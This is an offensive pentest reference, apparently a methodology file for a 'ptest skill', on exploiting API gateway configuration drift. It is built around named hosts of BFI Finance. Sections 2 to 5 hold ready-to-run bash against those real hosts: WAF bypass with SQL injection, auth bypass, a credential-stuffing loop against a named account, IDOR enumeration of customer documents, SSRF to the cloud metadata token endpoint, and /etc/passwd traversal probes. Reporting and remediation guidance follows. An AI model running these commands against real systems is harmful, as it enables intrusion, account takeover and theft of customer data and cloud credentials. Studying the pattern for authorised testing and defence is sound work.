# Gateway Misconfiguration Patterns Reference

## Offensive Security Reference for Multi-Gateway Configuration Drift

**Origin:** BFI Finance pentest (May 2026) — fixes applied to `microservices.prod.bfi.co.id` were NOT applied to `microservices.prod.bravo.bfi.co.id`, exposing the same backend via an unpatched parallel gateway.

**Last Updated:** 2026-05-22

---

## 1. Overview

### What Is Gateway Misconfiguration Drift?

Gateway misconfiguration drift occurs when an organization operates multiple API gateways, ingress controllers, or reverse proxies routing to the same backend services, but applies security fixes, WAF rules, or access controls inconsistently across them.

### Why It's Common

- **Separate teams** manage different gateways (platform team vs app team vs security team)
- **Blue/green or canary deployments** leave old configurations active
- **Acquisitions and mergers** bring parallel infrastructure (common in Indonesian banking — Bank Jago acquiring entities, BFI Finance multi-brand)
- **DR/failover gateways** are configured once and forgotten
- **Multi-cloud or hybrid** setups with different ingress per environment
- **Manual kubectl/console changes** not committed to GitOps repos
- **CDN/WAF onboarding** only covers the "primary" domain

### Impact

A vulnerability patched on the primary gateway remains exploitable on any parallel gateway that routes to the same backend. This effectively nullifies the fix — attackers only need to find ONE unpatched path.

---

## 2. Discovery Techniques

### 2.1 DNS Enumeration for Parallel Gateways

```bash
# Subdomain enumeration targeting gateway patterns
subfinder -d bfi.co.id -silent | grep -iE '(api|gateway|gw|microservice|ms|internal|bravo|backup|dr|staging|uat)'

# Common Indonesian fintech gateway naming patterns
for prefix in microservices api gateway gw ms services backend; do
  for env in prod bravo internal dr backup uat staging canary blue green; do
    host "${prefix}.${env}.bfi.co.id" 2>/dev/null | grep -v "NXDOMAIN"
  done
done

# DNS zone transfer attempt (unlikely but free check)
dig axfr bfi.co.id @$(dig NS bfi.co.id +short | head -1)

# Certificate transparency for alternative gateway domains
curl -s "https://crt.sh/?q=%.bfi.co.id&output=json" | jq -r '.[].name_value' | sort -u | grep -iE '(api|micro|gateway|service)'
```

### 2.2 Response Header Fingerprinting

Different gateways often leak their identity through response headers:

```bash
#!/bin/bash
# gateway-fingerprint.sh — Compare response headers across suspected parallel gateways
ENDPOINTS=(
  "https://microservices.prod.bfi.co.id"
  "https://microservices.prod.bravo.bfi.co.id"
  "https://api.internal.bfi.co.id"
)

TARGET_PATH="/api/v1/health"

for endpoint in "${ENDPOINTS[@]}"; do
  echo "=== ${endpoint}${TARGET_PATH} ==="
  curl -sk -o /dev/null -w "HTTP/%{http_version} %{response_code}\n" \
    -D - "${endpoint}${TARGET_PATH}" 2>/dev/null | grep -iE \
    '(server:|x-powered|x-request-id|x-envoy|x-kong|x-amzn|via:|x-cache|x-forwarded|strict-transport|content-security-policy|x-frame-options)'
  echo ""
done
```

**Key differentiators to look for:**

| Header | Indicates |
|--------|-----------|
| `server: envoy` | Istio/Envoy sidecar proxy |
| `server: kong/` | Kong API Gateway |
| `x-kong-upstream-latency` | Kong with upstream timing |
| `x-envoy-upstream-service-time` | Envoy/Istio mesh |
| `via: 1.1 google` | Google Cloud Load Balancer |
| `x-amzn-requestid` | AWS API Gateway |
| `x-azure-ref` | Azure Front Door |
| `server: cloudflare` | Cloudflare (CDN/WAF layer) |
| `x-request-id` format differences | Different gateway versions |

### 2.3 TLS Certificate Differences

```bash
#!/bin/bash
# cert-compare.sh — Compare TLS certificates across gateways
HOSTS=(
  "microservices.prod.bfi.co.id"
  "microservices.prod.bravo.bfi.co.id"
)

for host in "${HOSTS[@]}"; do
  echo "=== ${host} ==="
  echo | openssl s_client -servername "$host" -connect "${host}:443" 2>/dev/null | \
    openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null
  echo ""
done
```

**What to look for:**
- Different certificate issuers (one uses Let's Encrypt, other uses DigiCert → different infrastructure)
- Different SAN lists (reveals other hostnames on same cert)
- Different expiry dates (one renewed, other forgotten)
- Wildcard vs specific certs (wildcard may cover shadow gateways)

### 2.4 IP Address and Network Path Differences

```bash
#!/bin/bash
# network-path-compare.sh
HOSTS=(
  "microservices.prod.bfi.co.id"
  "microservices.prod.bravo.bfi.co.id"
)

for host in "${HOSTS[@]}"; do
  echo "=== ${host} ==="
  echo "IP: $(dig +short "$host" | head -1)"
  echo "ASN: $(whois $(dig +short "$host" | head -1) | grep -i origin)"
  # Check if different CDN/cloud provider
  curl -sk "https://$host" -o /dev/null -w "Remote IP: %{remote_ip}\nTime: %{time_total}s\n"
  echo ""
done
```

### 2.5 Behavioral Fingerprinting

```bash
# Send malformed requests — different gateways handle errors differently
for host in microservices.prod.bfi.co.id microservices.prod.bravo.bfi.co.id; do
  echo "=== $host ==="
  # Invalid HTTP method
  curl -sk -X INVALID "https://$host/" -w "%{http_code}" -o /dev/null
  # Oversized header
  curl -sk -H "X-Test: $(python3 -c 'print("A"*8192)')" "https://$host/" -w " %{http_code}" -o /dev/null
  # Path traversal in URL
  curl -sk "https://$host/..%2f..%2fetc/passwd" -w " %{http_code}" -o /dev/null
  echo ""
done
```

---

## 3. Common Patterns

### 3.1 Parallel Gateway Variants

**Pattern:** `service.prod.company.tld` and `service.prod.{variant}.company.tld`

**Real-world example (BFI Finance):**
```
microservices.prod.bfi.co.id        → Gateway A (patched, WAF active)
microservices.prod.bravo.bfi.co.id  → Gateway B (unpatched, no WAF)
```

Both route to the same Kubernetes backend services. Gateway A received the security fix; Gateway B was overlooked.

**Discovery signals:**
- DNS enumeration reveals `bravo`, `charlie`, `backup`, `dr`, `legacy` subdomains
- Same API responses but different security headers
- One returns `403` for a payload, the other returns `200`

**Indonesian fintech naming conventions observed:**
```
api.prod.bankjago.co.id / api.prod.internal.bankjago.co.id
services.bfi.co.id / services.bravo.bfi.co.id
gateway.prod.company.id / gateway.dr.company.id
```

### 3.2 Environment-Specific Gateways

**Pattern:** Different Kubernetes namespaces or clusters with separate ingress controllers.

```
# Production cluster A (Jakarta DC)
ingress-prod-jkt.company.id → backend services

# Production cluster B (Surabaya DR)  
ingress-prod-sby.company.id → same backend services (replicated)

# "Internal" gateway (no WAF, relaxed CORS)
internal-api.company.id → same backend services
```

**Discovery:**
```bash
# Check for internal/private gateway exposure
for prefix in internal private corp office vpn admin mgmt; do
  dig +short "${prefix}.bfi.co.id"
  dig +short "${prefix}-api.bfi.co.id"
  dig +short "api.${prefix}.bfi.co.id"
done
```

### 3.3 CDN/WAF Bypass via Direct Gateway Access

**Pattern:** CDN/WAF protects the public domain, but the origin gateway is directly accessible.

```bash
# Find origin IP behind CDN
# Method 1: Historical DNS records
curl -s "https://securitytrails.com/domain/bfi.co.id/history/a" # (or use API)

# Method 2: Check if origin responds on IP directly
ORIGIN_IP="103.x.x.x"  # Found via recon
curl -sk -H "Host: microservices.prod.bfi.co.id" "https://${ORIGIN_IP}/api/v1/target"

# Method 3: Check common origin patterns
for origin in origin direct backend origin-api; do
  dig +short "${origin}.bfi.co.id"
done

# Method 4: Email headers often reveal origin IPs
# Check MX records and SPF includes for IP ranges
dig TXT bfi.co.id | grep -i spf
```

**Exploitation:**
```bash
# Bypass Cloudflare/Akamai WAF by hitting origin directly
# WAF blocks SQLi on: https://microservices.prod.bfi.co.id/api/users?id=1'
# Origin allows it:
curl -sk -H "Host: microservices.prod.bfi.co.id" \
  "https://103.x.x.x/api/users?id=1' OR 1=1--"
```

### 3.4 Load Balancer Inconsistencies

**Pattern:** Multiple backend instances behind a load balancer, some patched, others not.

```bash
#!/bin/bash
# lb-consistency-check.sh — Hit the same endpoint repeatedly to detect inconsistent backends
HOST="microservices.prod.bfi.co.id"
PATH_TO_TEST="/api/v1/vulnerable-endpoint"
PAYLOAD="test-payload-here"
ITERATIONS=20

echo "Testing ${HOST}${PATH_TO_TEST} x${ITERATIONS}"
for i in $(seq 1 $ITERATIONS); do
  RESPONSE=$(curl -sk "https://${HOST}${PATH_TO_TEST}" \
    -H "X-Test: ${PAYLOAD}" \
    -w "\n%{http_code}|%{size_download}|%{remote_ip}" \
    -o /tmp/lb_response_${i}.txt)
  STATUS=$(echo "$RESPONSE" | tail -1 | cut -d'|' -f1)
  SIZE=$(echo "$RESPONSE" | tail -1 | cut -d'|' -f2)
  IP=$(echo "$RESPONSE" | tail -1 | cut -d'|' -f3)
  echo "Request ${i}: status=${STATUS} size=${SIZE} ip=${IP}"
done

# Compare responses for inconsistencies
md5sum /tmp/lb_response_*.txt | sort | uniq -c -w 32 | sort -rn
```

**Indicators of inconsistent backends:**
- Alternating response codes (200/403/200/403)
- Different response sizes for identical requests
- Different `X-Request-Id` formats
- Different `Server` header versions

### 3.5 Istio/Service Mesh VirtualService Routing Differences

**Pattern:** Multiple VirtualService definitions route different hostnames to the same service but with different policies.

```yaml
# What the attacker infers from behavior differences:
# VirtualService A (patched) — microservices.prod.bfi.co.id
# - Has AuthorizationPolicy enforcing JWT validation
# - Has RequestAuthentication requiring valid tokens
# - Has rate limiting via EnvoyFilter

# VirtualService B (unpatched) — microservices.prod.bravo.bfi.co.id  
# - No AuthorizationPolicy (or permissive)
# - No RequestAuthentication
# - No rate limiting
```

**Detection from outside:**
```bash
# Compare authentication enforcement
# Gateway A — requires auth
curl -sk "https://microservices.prod.bfi.co.id/api/v1/accounts" 
# Expected: 401 Unauthorized

# Gateway B — no auth enforcement
curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/accounts"
# Actual: 200 OK with data (!)

# Compare rate limiting
for i in $(seq 1 100); do
  curl -sk -o /dev/null -w "%{http_code}\n" \
    "https://microservices.prod.bravo.bfi.co.id/api/v1/accounts"
done | sort | uniq -c
# If no 429s appear, rate limiting is missing on this gateway
```

---

## 4. Testing Methodology

### 4.1 Systematic Gateway Enumeration

```bash
#!/bin/bash
# gateway-enum.sh — Full gateway enumeration for a target domain
TARGET_DOMAIN="bfi.co.id"
OUTPUT_DIR="./gateway-enum-$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 1: Subdomain enumeration"
subfinder -d "$TARGET_DOMAIN" -silent > "$OUTPUT_DIR/subdomains.txt"
amass enum -passive -d "$TARGET_DOMAIN" >> "$OUTPUT_DIR/subdomains.txt"
sort -u -o "$OUTPUT_DIR/subdomains.txt" "$OUTPUT_DIR/subdomains.txt"

echo "[*] Phase 2: Filter for gateway-like subdomains"
grep -iE '(api|gateway|gw|micro|ms|service|backend|internal|bravo|dr|backup|origin|direct|admin|mgmt|proxy)' \
  "$OUTPUT_DIR/subdomains.txt" > "$OUTPUT_DIR/gateway-candidates.txt"

echo "[*] Phase 3: Resolve and fingerprint"
while read -r host; do
  IP=$(dig +short "$host" | head -1)
  [ -z "$IP" ] && continue
  echo "$host,$IP" >> "$OUTPUT_DIR/resolved.txt"
done < "$OUTPUT_DIR/gateway-candidates.txt"

echo "[*] Phase 4: Group by backend (same IP or same response)"
# Hosts resolving to same IP likely share infrastructure
sort -t',' -k2 "$OUTPUT_DIR/resolved.txt" | \
  awk -F',' '{ips[$2]=ips[$2] " " $1} END {for (ip in ips) print ip ":" ips[ip]}' \
  > "$OUTPUT_DIR/ip-groups.txt"

echo "[*] Phase 5: Fingerprint each gateway"
while read -r host; do
  IP=$(echo "$host" | cut -d',' -f2)
  HOST=$(echo "$host" | cut -d',' -f1)
  {
    echo "=== $HOST ($IP) ==="
    curl -sk -I "https://$HOST/" 2>/dev/null | head -20
    echo "---"
  } >> "$OUTPUT_DIR/fingerprints.txt"
done < "$OUTPUT_DIR/resolved.txt"

echo "[+] Results in $OUTPUT_DIR/"
```

### 4.2 Parallel Vulnerability Testing

Once you've identified multiple gateways to the same backend, test EVERY finding against ALL gateways:

```bash
#!/bin/bash
# parallel-vuln-test.sh — Test a vulnerability across all identified gateways
GATEWAYS=(
  "microservices.prod.bfi.co.id"
  "microservices.prod.bravo.bfi.co.id"
  # Add all discovered gateways here
)

VULN_PATH="/api/v1/customers/lookup"
VULN_METHOD="POST"
VULN_HEADERS='-H "Content-Type: application/json"'
VULN_BODY='{"nik":"3171234567890001","bypass_auth":true}'

echo "Testing vulnerability across ${#GATEWAYS[@]} gateways"
echo "Endpoint: ${VULN_METHOD} ${VULN_PATH}"
echo "---"

for gw in "${GATEWAYS[@]}"; do
  echo -n "[*] ${gw}: "
  RESPONSE=$(curl -sk -X "$VULN_METHOD" \
    -H "Content-Type: application/json" \
    -d "$VULN_BODY" \
    -w "\n%{http_code}" \
    "https://${gw}${VULN_PATH}")
  
  STATUS=$(echo "$RESPONSE" | tail -1)
  BODY=$(echo "$RESPONSE" | sed '$d')
  
  if [ "$STATUS" -eq 200 ]; then
    echo "VULNERABLE (HTTP ${STATUS})"
    echo "  Response preview: $(echo "$BODY" | head -c 200)"
  elif [ "$STATUS" -eq 403 ] || [ "$STATUS" -eq 401 ]; then
    echo "PATCHED (HTTP ${STATUS})"
  else
    echo "UNKNOWN (HTTP ${STATUS}) — investigate manually"
  fi
  echo ""
done
```

### 4.3 Configuration Drift Detection Matrix

For each vulnerability found, build a matrix:

```bash
#!/bin/bash
# drift-matrix.sh — Build a configuration drift matrix
GATEWAYS=("microservices.prod.bfi.co.id" "microservices.prod.bravo.bfi.co.id")

# Define checks as "description|method|path|expected_secure_status"
CHECKS=(
  "Auth enforcement|GET|/api/v1/accounts|401"
  "Rate limiting|GET|/api/v1/health|429"  # after 100 rapid requests
  "CORS policy|OPTIONS|/api/v1/accounts|204"
  "SQL injection WAF|GET|/api/v1/users?id=1'OR'1'='1|403"
  "Path traversal WAF|GET|/..%2f..%2fetc/passwd|403"
  "Security headers|GET|/|has-csp"
)

printf "%-40s" "Check"
for gw in "${GATEWAYS[@]}"; do
  printf "%-35s" "$gw"
done
echo ""
printf '%.0s-' {1..110}; echo ""

for check in "${CHECKS[@]}"; do
  DESC=$(echo "$check" | cut -d'|' -f1)
  METHOD=$(echo "$check" | cut -d'|' -f2)
  PATH=$(echo "$check" | cut -d'|' -f3)
  EXPECTED=$(echo "$check" | cut -d'|' -f4)
  
  printf "%-40s" "$DESC"
  for gw in "${GATEWAYS[@]}"; do
    STATUS=$(curl -sk -X "$METHOD" -o /dev/null -w "%{http_code}" "https://${gw}${PATH}")
    if [ "$STATUS" = "$EXPECTED" ]; then
      printf "%-35s" "✓ SECURE ($STATUS)"
    else
      printf "%-35s" "✗ DRIFT ($STATUS)"
    fi
  done
  echo ""
done
```

---

## 5. Exploitation Patterns

### 5.1 Authentication Bypass via Gateway Drift

```bash
# Primary gateway enforces OAuth2/JWT — returns 401 without token
curl -sk "https://microservices.prod.bfi.co.id/api/v1/customer/profile" \
  -H "X-Customer-Id: 12345"
# → 401 Unauthorized

# Parallel gateway has no auth policy — direct backend access
curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/customer/profile" \
  -H "X-Customer-Id: 12345"
# → 200 OK {"name": "...", "nik": "...", "phone": "..."}
```

### 5.2 WAF Rule Bypass

```bash
# WAF on primary blocks injection attempts
curl -sk "https://microservices.prod.bfi.co.id/api/v1/loans/search" \
  -d '{"query": "1 UNION SELECT * FROM users--"}'
# → 403 Forbidden (WAF block)

# Parallel gateway has no WAF integration
curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/loans/search" \
  -d '{"query": "1 UNION SELECT * FROM users--"}'
# → 200 OK (SQL injection successful)
```

### 5.3 Rate Limit Bypass for Credential Stuffing

```bash
# Primary gateway rate-limits login to 5 attempts/minute
# Parallel gateway has no rate limiting
for password in $(cat /usr/share/wordlists/common-passwords.txt); do
  curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/auth/login" \
    -d "{\"username\":\"target@bfi.co.id\",\"password\":\"${password}\"}" \
    -H "Content-Type: application/json" \
    -w "%{http_code}\n" -o /dev/null
done
```

### 5.4 IDOR Exploitation on Unpatched Gateway

```bash
# Primary gateway added authorization checks (user can only access own data)
# Parallel gateway still allows IDOR
for customer_id in $(seq 10000 10100); do
  RESPONSE=$(curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/customers/${customer_id}/documents" \
    -H "Authorization: Bearer ${VALID_LOW_PRIV_TOKEN}")
  echo "${customer_id}: $(echo $RESPONSE | jq -r '.documents[0].type // "empty"')"
done
```

### 5.5 Chaining: Gateway Drift + SSRF

```bash
# If one gateway allows SSRF to internal services that the other blocks:
curl -sk "https://microservices.prod.bravo.bfi.co.id/api/v1/webhook/test" \
  -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}' \
  -H "Content-Type: application/json" \
  -H "Metadata-Flavor: Google"
```

---

## 6. Reporting Guidance

### 6.1 Frame as Systemic Finding

**DO NOT** report each gateway bypass as a separate vulnerability. Frame it as:

**Title:** Systemic Gateway Configuration Drift — Security Controls Not Applied Uniformly Across All Ingress Points

**Severity:** Critical (if auth bypass) / High (if WAF bypass only)

**Root Cause:** Lack of centralized gateway policy management. Security fixes applied to individual gateway configurations rather than a shared policy source.

### 6.2 Report Structure

```markdown
## Finding: Gateway Configuration Drift Enabling Security Control Bypass

### Summary
Multiple API gateways route to the same backend microservices but have 
inconsistent security configurations. Fixes applied to the primary gateway 
(microservices.prod.bfi.co.id) are not propagated to parallel gateways 
(microservices.prod.bravo.bfi.co.id), allowing attackers to bypass security 
controls by routing requests through the unpatched gateway.

### Affected Gateways
| Gateway | Auth Policy | WAF | Rate Limiting | Last Config Update |
|---------|-------------|-----|---------------|-------------------|
| microservices.prod.bfi.co.id | ✓ Enforced | ✓ Active | ✓ Active | 2026-05-15 |
| microservices.prod.bravo.bfi.co.id | ✗ Missing | ✗ Missing | ✗ Missing | 2026-01-10 |

### Impact
- Authentication bypass on N endpoints
- WAF bypass allowing injection attacks
- Rate limiting bypass enabling brute force
- All previously-patched vulnerabilities re-exploitable via alternate gateway

### Proof of Concept
[Include specific curl commands showing the same request blocked on one 
gateway but allowed on another]

### Root Cause
Gateway configurations are managed independently rather than through a 
shared policy-as-code repository. The "bravo" gateway appears to be a 
DR/failover instance that was not included in the security remediation 
workflow.

### Remediation
[See Section 7 below]
```

### 6.3 CVSS Scoring Considerations

- Score based on the **worst-case exploitable path** (the unpatched gateway)
- Attack Complexity: Low (attacker just changes the hostname)
- Note that the "fix" already exists — it just needs to be applied uniformly
- This often elevates findings because it demonstrates a process failure, not just a technical one

### 6.4 Indonesian Regulatory Context

For Indonesian financial services (OJK-regulated entities like BFI Finance):
- Reference **POJK 11/2022** (IT risk management for financial services)
- Reference **SEOJK 29/2022** (operational resilience)
- Configuration drift in security controls may constitute a compliance violation
- Frame remediation urgency around regulatory requirements

---

## 7. Remediation Recommendations

### 7.1 Immediate (Tactical)

```bash
# Identify all gateways routing to the same backend
kubectl get virtualservices -A -o json | jq '.items[] | select(.spec.http[].route[].destination.host == "target-service") | .metadata.name'

# Apply the same security policy to all gateways
kubectl get authorizationpolicy -n prod-namespace -o yaml > /tmp/auth-policy.yaml
# Edit and apply to all namespaces/gateways
```

### 7.2 Short-term (Process)

- **Inventory all ingress points** — document every gateway, load balancer, and reverse proxy that can reach backend services
- **Unified WAF policy** — apply WAF rules at the service mesh level (Istio AuthorizationPolicy) rather than per-gateway
- **Security fix checklist** — every remediation ticket must include "Apply to ALL gateways" as a completion criterion
- **Automated drift detection** — scheduled comparison of gateway configs

### 7.3 Long-term (Architecture)

**GitOps for Gateway Configuration:**
```yaml
# Example: Shared gateway policy in Git (applied to ALL gateways via ArgoCD/Flux)
# security-policies/base/authorization-policy.yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: require-jwt-all-gateways
  namespace: istio-system  # Applied at mesh level, not per-gateway
spec:
  rules:
  - from:
    - source:
        requestPrincipals: ["*"]
    to:
    - operation:
        paths: ["/api/*"]
```

**Infrastructure-as-Code Gateway Sync:**
```hcl
# Terraform module that ensures ALL gateways get the same config
module "api_gateway" {
  source   = "./modules/gateway-config"
  for_each = toset(["prod-primary", "prod-bravo", "prod-dr"])
  
  gateway_name    = each.key
  waf_rules       = var.shared_waf_rules      # Single source of truth
  auth_policy     = var.shared_auth_policy     # Single source of truth
  rate_limit_config = var.shared_rate_limits   # Single source of truth
  cors_policy     = var.shared_cors_policy     # Single source of truth
}
```

**Automated Drift Detection Pipeline:**
```yaml
# .github/workflows/gateway-drift-check.yml
name: Gateway Configuration Drift Check
on:
  schedule:
    - cron: '0 */6 * * *'  # Every 6 hours
jobs:
  drift-check:
    runs-on: ubuntu-latest
    steps:
      - name: Compare gateway configs
        run: |
          # Pull live config from all gateways
          for gw in prod-primary prod-bravo prod-dr; do
            kubectl --context="${gw}" get virtualservices,authorizationpolicies,envoyfilters \
              -n istio-system -o yaml > "/tmp/${gw}-config.yaml"
          done
          # Diff and alert on drift
          if ! diff /tmp/prod-primary-config.yaml /tmp/prod-bravo-config.yaml > /dev/null; then
            echo "::error::Configuration drift detected between prod-primary and prod-bravo"
            exit 1
          fi
```

### 7.4 Verification After Remediation

```bash
# Re-run the parallel vulnerability test (Section 4.2) against ALL gateways
# Confirm identical security behavior across all ingress points
# Document which gateways were tested in the remediation evidence
```

---

## Quick Reference: Gateway Drift Checklist

For every vulnerability discovered during a pentest:

- [ ] Enumerate ALL gateways/ingress points to the same backend
- [ ] Test the vulnerability against EACH gateway independently
- [ ] Document which gateways are patched vs unpatched
- [ ] Check if WAF rules are applied uniformly
- [ ] Check if auth policies are applied uniformly
- [ ] Check if rate limiting is applied uniformly
- [ ] Check if CORS policies are consistent
- [ ] Check if security headers are consistent
- [ ] Test from different network paths (CDN vs direct, internal vs external)
- [ ] Report as a single systemic finding with gateway-specific evidence
- [ ] Recommend centralized policy management in remediation

---

## Appendix: Kong API Gateway Response Taxonomy

When testing targets behind Kong + Tencent WAF (common in GoTo/Gojek ecosystem), responses follow a strict hierarchy. Understanding this prevents wasted time on false positives.

| Response | Source | Meaning | Action |
|----------|--------|---------|--------|
| 400 + `T-Sec-WAF: StdPortNoMatchServer` | Tencent WAF | Host header doesn't match any configured server | Wrong Host or direct IP access — try proper hostname |
| 403 + HTML "WAF Block Page" (2838 bytes) | Tencent WAF | WAF rule triggered (dotfiles, traversal, SQLi patterns) | Try WAF bypass techniques |
| 404 + `{"message":"no Route matched with those values"}` (48 bytes) | Kong | Path exists in Kong but no route configured | Path doesn't reach any backend — try different prefixes |
| 401 + `{"message":"missing auth header"}` (40 bytes) | Kong auth plugin | Route exists AND requires Bearer token | Real endpoint — needs auth token |
| 401 + `{"message":"invalid_auth_header"}` | Kong auth plugin | Token provided but malformed/expired | Token validation is happening — real endpoint |
| 401 + `{"message":"invalid_algorithm"}` | Kong/backend | JWT alg:none or unsupported algorithm rejected | JWT validation is strict |
| 307/308 + Location header | Kong/backend | Redirect (e.g., /auth/login → Google OAuth) | Follow redirect, map auth flow |
| 301 + Location to login page | Kong catch-all | All unmatched routes redirect to auth | False positive — Kong catch-all rule |

**Enumeration strategy for Kong targets:**
1. First, identify the "no route" response (404, 48 bytes) — this is your baseline for "path doesn't exist"
2. Any response OTHER than this baseline means the path is routed somewhere
3. 401 = real endpoint requiring auth (highest value for mapping)
4. 403 = WAF blocking (try bypass) OR application-level block (check response body)
5. Filter ffuf/gobuster by size: `-fs 48` (Kong no-route) and `-fs 2838` (WAF block page)

**Kong + SPA catch-all pitfall:**
When Kong routes a path to a React/Next.js SPA backend, ALL sub-paths return 200 with the same HTML (SPA serves index.html for client-side routing). Always verify by comparing response sizes:
```bash
# If these are all identical size → SPA catch-all, not real endpoints
curl -sk -o /dev/null -w "%{size_download}" "https://target/app/actuator"
curl -sk -o /dev/null -w "%{size_download}" "https://target/app/nonexistent12345"
curl -sk -o /dev/null -w "%{size_download}" "https://target/app/"
```

---

## Appendix: Common Gateway Technologies in Indonesian Fintech

| Technology | Indicators | Common Drift Points |
|-----------|-----------|-------------------|
| Kong Gateway | `server: kong/X.Y`, `x-kong-*` headers | Plugin configs per route vs global |
| Istio/Envoy | `server: envoy`, `x-envoy-*` headers | VirtualService per namespace |
| NGINX Ingress | `server: nginx`, K8s ingress annotations | Per-ingress annotation differences |
| AWS API Gateway | `x-amzn-requestid`, `x-amz-apigw-id` | Stage-specific configs |
| Cloudflare | `server: cloudflare`, `cf-ray` header | Only primary domain onboarded |
| Akamai | `x-akamai-*` headers | Property configs per hostname |
| F5 BIG-IP | `server: BigIP`, cookie patterns | iRule differences per VIP |
| Traefik | `server: Traefik` | IngressRoute middleware differences |

---

*This reference is part of the ptest skill's security testing methodology. Update as new gateway drift patterns are discovered in engagements.*
